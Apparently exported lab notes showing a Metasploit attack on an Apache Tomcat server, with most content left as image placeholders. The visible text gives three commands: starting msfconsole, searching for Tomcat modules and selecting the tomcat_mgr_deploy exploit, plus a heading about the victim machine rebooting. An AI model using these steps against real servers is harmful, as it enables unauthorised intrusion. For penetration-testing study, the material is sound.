...
![image.png](attachment:540255a7-4eb2-441c-a82c-4260c8601faf:image.png)
...
![image.png](attachment:b2368c6f-4d4d-4188-874c-c0009f4424b9:image.png)

![image.png](attachment:f8909250-7ba6-43f6-9f42-675b5f426503:image.png)

```bash
sudo msfconsole
```

![image.png](attachment:43a0c097-fa01-418e-bf49-5ff041c6ac1d:image.png)

```bash
search apache tomcat
```

![image.png](attachment:4f3ccbb6-e64f-4f5d-a2d7-927f24d3362b:image.png)

```bash
use exploit/multi/http/tomcat_mgr_deploy
```

![image.png](attachment:77152025-9921-4c94-bde6-fcaccf92f57d:image.png)
...
![image.png](attachment:57ea0068-4f01-4521-8874-9607ff4350f2:image.png)
...
![image.png](attachment:ad260009-96cc-4cd1-8d6f-202ff20b84ca:image.png)
...
![image.png](attachment:1ef53900-d7c9-4c97-aa35-efd066bb017c:image.png)
...
![image.png](attachment:ed17d8df-cc5a-4f06-b606-6337c3736c39:image.png)
...
![image.png](attachment:8a847610-b388-4f20-bdcb-6c1b28c5e6fb:image.png)
...
![image.png](attachment:427ec36c-94ac-4ab1-bd53-efa46074ebf1:image.png)

## Now When the User Reboots the Victim Machine

![image.png](attachment:8fcbd3f7-6e95-4110-8dbe-f50fe3819637:image.png)

![image.png](attachment:a97ed2af-c4d8-4dd1-bdbe-3daff6f6e374:image.png)
...
![image.png](attachment:bf1180a9-7e9c-4f3e-813d-44f77d567b29:image.png)

![image.png](attachment:714cf360-b2ed-488f-b61c-df02d5bf67fe:image.png)
...
![image.png](attachment:651db97c-0506-42aa-97a0-d1b7c2c6050c:image.png)
